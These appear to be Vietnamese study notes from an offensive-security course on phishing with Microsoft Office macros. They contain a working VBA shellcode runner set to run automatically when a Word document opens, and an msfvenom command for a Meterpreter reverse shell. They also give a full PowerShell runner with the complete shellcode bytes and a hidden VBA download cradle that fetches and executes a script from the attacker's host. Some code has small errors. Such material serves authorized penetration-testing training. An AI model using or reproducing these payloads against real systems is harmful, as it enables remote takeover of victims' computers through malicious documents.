Chúng ta sẽ thêm mảng này vào mã VBA. Tiếp theo, đặt các đối số cho `VirtualAlloc`. Theo MSDN, chúng ta đặt `lpAddress` là "0". Đối với `dwSize`, thay vì cố định kích thước, chúng ta sẽ sử dụng hàm `UBound` để lấy kích thước động của mảng `buf`.
Đối với đối số thứ ba, chúng ta sử dụng `0x3000` (tương đương `MEM_COMMIT` và `MEM_RESERVE`), trong VBA được biểu diễn là `&H3000`. Đối số cuối cùng được đặt là `&H40` (0x40), biểu thị vùng nhớ có quyền đọc, ghi và thực thi.

```vba
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Dim buf As Variant
Dim addr As LongPtr

buf = Array(252,72,131,228,240,232...)

addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
```

Sau khi đã cấp phát bộ nhớ, chúng ta phải sao chép các byte shellcode vào vị trí này bằng `RtlMoveMemory`
```c
VOID RtlMoveMemory(
  VOID UNALIGNED *Destination,
  VOID UNALIGNED *Source,
  SIZE_T         Length
);
```
Đối số `Destination` trỏ tới bộ đệm vừa cấp phát, `Source` là địa chỉ phần tử trong mảng shellcode, và `Length` là độ dài.
```vba
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (
    ByVal lDestination As LongPtr,
    ByRef sSource As Any,
    By lLength As Long
) As LongPtr
```
Chúng ta sẽ dùng vòng lặp `For` để sao chép từng byte của payload vào bộ nhớ.
```vba
For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
Next counter
```
Cuối cùng, sử dụng `CreateThread` để thực thi shellcode tại địa chỉ bộ nhớ đã xác định.
```c
HANDLE CreateThread(
  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  SIZE_T                  dwStackSize,
  LPTHREAD_START_ROUTINE  lpStartAddress,
  LPVOID                  lpParameter,
  DWORD                   dwCreationFlags,
  LPDWORD                 lpThreadId
);
```
Chúng ta cần khai báo hàm này trong VBA:
```vba
Private Declare PtrSafe Function CreateThread Lib "KERNEL32"(
    ByVal SecurityAttributes As Long,
    ByVal StackSize As Long,
    ByVal StartFunction As LongPtr,
    ThreadParameter As LongPtr,
    ByVal CreateFlags As Long,
    ByRef ThreadId As Long
) As LongPtr
```

Sau đó, chúng ta gọi hàm này: `res = CreateThread(0, 0, addr, 0, 0, 0)`
```vba
' Khai báo các hàm Win32 API
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    ' Mảng Shellcode (đã rút gọn)
    buf = Array(252, 72, 131, 228, 240, 232, 204, 0, 0, 0, 65, 81, 65, 80, 82, 72, 49, 210, 81, 101, 72, 06, 0, 89, 187, 224, 29, 42, 10, 65, 137, 218, 255, 213)

    ' Cấp phát bộ nhớ thực thi
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    ' Sao chép shellcode vào vùng nhớ
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    ' Thực thi shellcode qua luồng mới
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

Kết quả:
![[Phishing with Microsoft Office-8.png|center|border|700]]
## PowerShell Shellcode
Dù chúng ta đã có một công cụ khai thác hoạt động, vẫn còn những điểm cẩn cải thiện:
- Vấn đề file: Tài liệu Word chứa shellcode giai đoạn 1 và được lưu trên ổ cứng, có khả năng bị phần mềm diệt virus phát hiện.
- Sự phụ thuộc vào tiến trình: Phiên bản VBA trước đây thực thi shellcode trực tiếp trong bộ nhớ của tiến trình Word. Nếu nạn nhân đòng Word, chúng ta sẽ mất quyền điều khiển shell.
Vì vậy, thay vì nhúng shellcode vào macro, chúng ta sẽ lệnh cho macro tải một script PowerShell từ máy chủ web của chúng ta và chạy nó trực tiếp trong bộ nhớ.
Launch PowerShell script như một **tiến trình con (child process)** của Microsoft Word. Theo cấu hình mặc định, tiến trình con này sẽ không bị tắt khi Word đóng lại, giúp chúng ta duy trì được quyền điều khiển.
Để thực hiện điều này, chúng ta dùng phương thức `DownloadString` của lớp `WebClient` để tải script PowerShell vào bộ nhớ và thực thi bằng lệnh `Invoke-Expression`. Chúng ta vẫn sử dụng các Win32 API cũ nhưng phải chuyển đổi cú pháp từ VBA sang PowerShell.
### Calling Win32 APIs from PowerShell
PowerShell không thể tương tác trực tiếp với các Win32 API (các hàm hệ thống của Windows), nhưng với sức mạnh của .NET framework, chúng ta có thể sử dụng mã C# ngay trong phiên làm việc (session) của PowerShell. Trong C#, chúng ta có thể khai báo và nhập (import) các Win32 API bằng lớp `DllImportAttribute`, cho phép chúng ta gọi các hàm nằm trong các thư viện liên kết động (DLL) không được quản lý (unmanaged).

Giống như cách chúng ta đã làm với VBA, chúng ta phải chuyển đổi các kiểu dữ liệu từ C (ngôn ngữ gốc của Windows API) sang kiểu dữ liệu của C#. Chúng ta có thể thực hiện việc này dễ dàng bằng dịch vụ của Microsoft có tên là **Platform Invocation Services**, thường được gọi là **P/Invoke**. Các API của P/Invoke nằm trong các không gian tên (namespace) `System` và `System.Runtime.InteropServices`, và chúng ta phải nhập chúng thông qua từ khóa chỉ thị `using`.

Cách đơn giản nhất để bắt đầu với P/Invoke là thông qua trang web [www.pinvoke.net](http://www.pinvoke.net), nơi lưu trữ các bản dịch của hầu hết các Win32 API thông dụng. Ví dụ, hãy xem xét cú pháp của hàm `MessageBox` từ `User32.dll`:
```
int MessageBox(
  HWND    hWnd,
  LPCTSTR lpText,
  LPCTSTR lpCaption,
  UINT    uType
);
```
Hãy "dịch" hàm này sang định dạng phương thức (method signature) của C#. Một "method signature" là định danh duy nhất của một phương thức dành cho trình biên dịch C#. Chữ ký này bao gồm tên phương thức, kiểu dữ liệu, loại tham số (giá trị, tham chiếu, hoặc đầu ra) của mỗi tham số chính thức và kiểu dữ liệu trả về.

Để "dịch" hàm này, chúng ta có thể tìm kiếm trên trang web `www.pinvoke.net` hoặc đơn giản là Google từ khóa "pinvoke User32 messagebox". Kết quả đầu tiên dẫn chúng ta đến chữ ký C# cho lệnh gọi này:
```cs
[DllImport("user32.dll", SetLastError = true, CharSet= CharSet.Auto)]
public static extern int MessageBox(int hWnd, String text, String caption, uint type);
```
Để sử dụng lệnh này, chúng ta cần thêm một chút mã để nhập các namespace `System` và `System.Runtime.InteropServices` chứa các API của P/Invoke. Sau đó, chúng ta sẽ tạo một lớp C# (tên là `User32`), lớp này nhập chữ ký `MessageBox` bằng `DllImport`. Lớp này sẽ cho phép chúng ta tương tác với Windows API. Chúng ta đặt tên nó là `User32` trong trường hợp này, nhưng tên lớp là tùy ý.
```cs
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text, 
        String caption, int options);
}
```
Bây giờ chúng ta đã có phần nhập C# và bản dịch P/Invoke, chúng ta cần gọi nó từ PowerShell bằng từ khóa **`Add-Type`**. Việc chỉ định `Add-Type` trong PowerShell sẽ ép .NET framework biên dịch và tạo ra một đối tượng chứa các cấu trúc, giá trị, hàm hoặc mã bên trong câu lệnh `Add-Type`.

Nói một cách đơn giản, `Add-Type` sử dụng .NET framework để biên dịch mã C# chứa các khai báo Win32 API. Dưới đây là câu lệnh `Add-Type` hoàn chỉnh:
```cs
$User32 = @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text, 
        String caption, int options);
}
"@

Add-Type $User32
```
Đầu tiên, lưu ý rằng PowerShell sử dụng ký tự xuống dòng hoặc dấu chấm phẩy để kết thúc một câu lệnh. Từ khóa `"@"` khai báo các chuỗi đa dòng (Here-Strings), giúp chúng ta khai báo các khối văn bản.

Tóm lại, đoạn mã trước tiên tạo ra một biến `$User32` và đặt nó thành một khối văn bản. Bên trong khối văn bản đó, chúng ta thiết lập chương trình sử dụng `System` và `System.Runtime.InteropServices`. Sau đó, chúng ta nhập API `MessageBox` từ `user32.dll`, và cuối cùng chúng ta sử dụng `Add-Type` để biên dịch mã C# chứa trong biến `$User32`.

Mã của chúng ta gần như đã hoàn tất. Bây giờ chúng ta chỉ cần thực thi chính API đó bằng cách khởi tạo đối tượng .NET `User32`. Trong trường hợp này, chúng ta sẽ gọi `MessageBox` và trình bày một hộp thoại thông báo có nội dung "This is an alert":
```powershell
$User32 = @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text, 
        String caption, int options);
}
"@

Add-Type $User32

[User32]::MessageBox(0, "This is an alert", "MyBox", 0)
```
Đoạn mã này sẽ gọi `MessageBox` từ PowerShell. Khi mã được thực thi, chúng ta sẽ thấy một hộp thoại thông báo xuất hiện.

Điều này hoạt động khá tốt và chứng minh rằng mặc dù PowerShell không thể sử dụng Win32 API theo cách tự nhiên, nhưng `Add-Type` có thể gọi chúng thông qua P/Invoke. Trong phần tiếp theo, chúng ta sẽ sử dụng một kỹ thuật tương tự để triển khai trình thực thi shellcode VBA bằng PowerShell.

**Task**: Sử dụng `Add-Type` để gọi Win32 API `GetDriveType` từ PowerShell giống như cách chúng ta đã làm trong phần này. Kết quả trả về khi gọi API này trên ổ đĩa `C:\` là gì?

```powershell
# 1. Khai báo chính xác vào biến $Win32API
$Win32API = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern uint GetDriveType(string lpRootPathName);
}
"@

# 2. Biên dịch biến $Win32API (lưu ý khớp tên biến)
Add-Type $Win32API

# 3. Gọi hàm đúng tên đã khai báo trong class
$result = [Kernel32]::GetDriveType("C:\")
Write-Host "Result: $result" 
```
###  Porting Shellcode Runner to PowerShell
Việc chuyển đổi kỹ thuật thực thi shellcode từ VBA sang PowerShell không quá phức tạp. Chúng ta có thể tái sử dụng lý thuyết từ phiên bản VBA. Chúng ta đã biết cần thực hiện 3 bước:
- Cấp phát bộ nhớ thực thi bằng `VirtualAlloc`.
- Sao chép shellcode vào vùng nhớ vừa cấp phát.
- Thực thi bằng `CreateThread`.
Trong mã VBA, chúng ta đã dùng `RtlMoveMemory` để sao chép shellcode, nhưng trong PowerShell, chúng ta có thể sử dụng phương thức `.NET Copy` từ namespace `System.Runtime.InteropServices.Marshal` để sao chép từ một mảng được quản lý (managed array) sang một con trỏ bộ nhớ không được quản lý (unmanaged memory pointer).
Sau khi tìm kiếm trên P/Invoke, chúng ta chuyển đổi các tham số của `VirtualAlloc` và `CreateThread` để tạo lệnh `Add-Type` như sau:
```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

Add-Type $Kernel32
```

Tiếp theo, chúng ta cung cấp shellcode cần thiết bằng `msfvenom` với định dạng `ps1`:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f ps1
```
Với shellcode đã có, chúng ta gán vào biến `$buf` và gọi các API:
```powershell
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0...
$size = $buf.Length
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
```
Nếu chạy đoạn mã này từ PowerShell ISE, chúng ta nhận được một kết nối reverse shell. 
![[Screenshot 2026-06-14 at 01.13.45.png|center|border|700]]
Full Source:

```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32

[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x51,0x48,0x8b,0x52,0x20,0x56,0x4d,0x31,0xc9,0x48,0xf,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x8b,0x48,0x18,0x50,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x41,0x58,0x48,0x1,0xd0,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x0,0x0,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x1,0x0,0x0,0x49,0x89,0xe5,0x49,0xbc,0x2,0x0,0x1,0xbb,0xc0,0xa8,0x2d,0xb3,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x7,0xff,0xd5,0x4c,0x89,0xea,0x68,0x1,0x1,0x0,0x0,0x59,0x41,0xba,0x29,0x80,0x6b,0x0,0xff,0xd5,0x6a,0xa,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xa,0x49,0xff,0xce,0x75,0xe5,0xe8,0x93,0x0,0x0,0x0,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x4,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,0x59,0x68,0x0,0x10,0x0,0x0,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x0,0x40,0x0,0x0,0x41,0x58,0x6a,0x0,0x5a,0x41,0xba,0xb,0x2f,0xf,0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x1,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,0x6a,0x0,0x59,0xbb,0xe0,0x1d,0x2a,0xa,0x41,0x89,0xda,0xff,0xd5

$size = $buf.Length
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0, $size, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$tHandle = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0)

[Kernel32]::WaitForSingleObject($tHandle, [uint32]"0xFFFFFFFF")

```

Tiếp theo, chúng ta sẽ sử dụng VBA làm "nôi" tải mã (Download Cradle)
Bây giờ, chúng ta sẽ kích hoạt mã này từ một macro trong Word. Chúng ta sẽ không nhúng code PowerShell vào VBA, mà tạo một "cradle" (cái nôi) để tải code vào bộ nhớ và thực thi:
```vba
Sub Marco()
    Dim str As String
    str = "powershell -ExecutePolicy Bypass (New-Object System.Net.WebClient).DownloadString('http://192.168.45.179/run.ps1) | IEX"
    Shell str, vbHide 
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```
Đầu tiên, chúng ta khai báo một chuỗi lệnh PowerShell để tải script qua `System.Net.WebClient`. Sau khi tải script về dưới dạng chuỗi vào bộ nhớ, nó được thực thi bằng lệnh `Invoke-Expression` (IEX). Toàn bộ quá trình được kích hoạt bằng lệnh `Shell` của VBA.

![[Screenshot 2026-06-14 at 01.48.36.png]]

![[Screenshot 2026-06-14 at 01.47.51.png]]
